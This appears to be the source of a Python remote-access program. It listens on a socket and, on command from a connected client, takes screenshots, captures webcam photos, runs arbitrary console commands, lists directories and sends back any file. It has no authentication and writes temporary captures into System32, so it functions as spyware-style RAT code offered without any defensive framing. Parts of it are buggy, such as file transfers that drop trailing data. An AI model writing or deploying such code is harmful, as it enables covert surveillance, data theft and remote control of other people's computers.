import pyautogui
import time
import socket
import json
import random
import psutil
import cv2
import os
import numpy as np


working_directory = "C:\\"
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("192.168.0.104", 1000))
server.listen()
print("Waiting for connection...")
conn, addr = server.accept()

def send_file(conn, buffer, filename):
    size = os.path.getsize(filename)
    conn.send(str(size).encode("utf-8"))
    parts = size // buffer
    with open(filename, "rb") as file:
        for i in range(parts):
            part = file.read(buffer)
            conn.send(part)


def do_stuff(conn, instruction):
    global working_directory
    if instruction[0] == "EXEC_SCREENSHOT":
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
        num = random.randint(1000000, 9999999)
        filename = f"C:\Windows\System32\screenshot{num}.png"
        cv2.imwrite(filename, image)
        send_file(conn, 512, filename)
        os.remove(filename)
    elif instruction[0] == "EXEC_CAMERA_PHOTO":
        video_capture = cv2.VideoCapture(0)
        frame = video_capture.read()[1]
        frame = cv2.cvtColor(np.array(frame), cv2.IMREAD_COLOR)
        filename = f"frame.jpeg"
        cv2.imwrite(filename, frame)
        send_file(conn, 1, filename)
        os.remove(filename)
    elif instruction[0] == "EXEC_CONSOLE":
        os.system(instruction[1])
    elif instruction[0] == "SET_WORKING_DIRECTORY":
        is_succeed = os.path.exists(instruction[1])
        if is_succeed:
            working_directory = instruction[1]
            if working_directory[len(working_directory)-1] == "\\":
                working_directory = working_directory[0:len(working_directory)-1]
        conn.send(str(is_succeed).encode("utf-8"))
    elif instruction[0] == "GET_DIRECTORY_CONTENTS":
        path = instruction[1] if len(instruction) == 2 else working_directory
        contents = os.listdir(path)
        result = {
            "contents": contents
        }
        result = json.dumps(result)
        conn.send(result.encode("utf-8"))    
    elif instruction[0] == "EXEC_FILE_TRANSFER":
        filename = instruction[1]
        if os.path.exists(filename):
            conn.send("true".encode("utf-8"))
            send_file(conn, 1024, filename)
        else:
            conn.send("false".encode("utf-8"))

 
while True:
    msg = conn.recv(1024).decode("utf-8")
    msg = json.loads(msg)
    do_stuff(conn, msg["instruction"])
